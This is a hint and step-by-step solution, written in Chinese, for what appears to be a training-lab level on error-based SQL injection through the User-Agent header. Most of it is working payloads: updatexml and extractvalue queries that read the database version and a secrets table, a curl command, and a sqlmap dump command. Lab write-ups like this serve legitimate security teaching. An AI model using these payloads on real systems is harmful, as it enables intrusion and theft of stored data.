思路提示

本关的注入点在 HTTP 请求头 User-Agent 里。页面加载时会把当前 UA 拼进 SQL 并回显结果。你需要用 Burp、curl 或浏览器插件修改 User-Agent 请求头，注入报错函数带出数据。

详细解题过程（点击展开）
1. 确认注入点：把 User-Agent 改成 admin'，刷新页面后出现 MySQL 语法错误，说明单引号未过滤、报错回显开启。
2. 闭合 + 注释：User-Agent: admin' -- -，不再报错，确认闭合方式为单引号。
3. 报错注入读版本：
User-Agent: ' or updatexml(1,concat(0x7e,version()),1)-- -
报错中出现 MySQL 版本号即证明注入成功。
4. 读通关凭证：
User-Agent: ' or updatexml(1,concat(0x7e,(select secret from secrets limit 1)),1)-- -
5. extractvalue 备选：
User-Agent: ' or extractvalue(1,concat(0x7e,(select secret from secrets limit 1)))-- -
6. 分段读取（报错约 32 字节截断）：
User-Agent: ' or updatexml(1,concat(0x7e,substr((select secret from secrets limit 1),1,20)),1)-- -
7. curl 命令行验证：
curl -H "User-Agent: ' or updatexml(1,concat(0x7e,(select secret from secrets limit 1)),1)-- -" {{SITE}}/modules/sqli/header.php
8. sqlmap 自动化：先把请求保存为 req.txt，再跑：
sqlmap -r req.txt -p User-Agent --technique=E -D bafanglab -T secrets --dump --batch
小提示：浏览器默认 UA 很长且含特殊字符，注入时建议用 Burp 或 curl 直接设置干净的 UA；请求头里 # 不会被当锚点，但 -- 后面的空格必须保留（可写成 --%20 或 -- -）。
